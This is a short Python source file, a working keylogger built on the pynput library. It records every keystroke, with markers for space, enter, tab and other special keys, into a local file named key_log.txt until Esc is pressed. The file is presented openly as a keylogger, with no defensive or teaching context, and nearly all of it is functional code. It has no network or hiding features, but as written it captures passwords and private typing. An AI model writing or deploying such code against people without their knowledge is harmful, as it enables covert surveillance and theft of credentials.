from pynput import keyboard

# Define the log file to save the keystrokes
LOG_FILE = "key_log.txt"

# Function to handle key press events
def on_press(key):
    try:
        # Log the pressed key (alphanumeric or symbol)
        with open(LOG_FILE, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Handle special keys (like space, enter, etc.)
        if key == keyboard.Key.space:
            with open(LOG_FILE, "a") as f:
                f.write(' ')
        elif key == keyboard.Key.enter:
            with open(LOG_FILE, "a") as f:
                f.write('\n')
        elif key == keyboard.Key.tab:
            with open(LOG_FILE, "a") as f:
                f.write('\t')
        else:
            # Log other special keys
            with open(LOG_FILE, "a") as f:
                f.write(f" [{key}] ")

# Function to handle key release events (not used but required by the listener)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when ESC is pressed
        return False

# Start the keyboard listener
def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Start the keylogger
if __name__ == "__main__":
    start_keylogger()
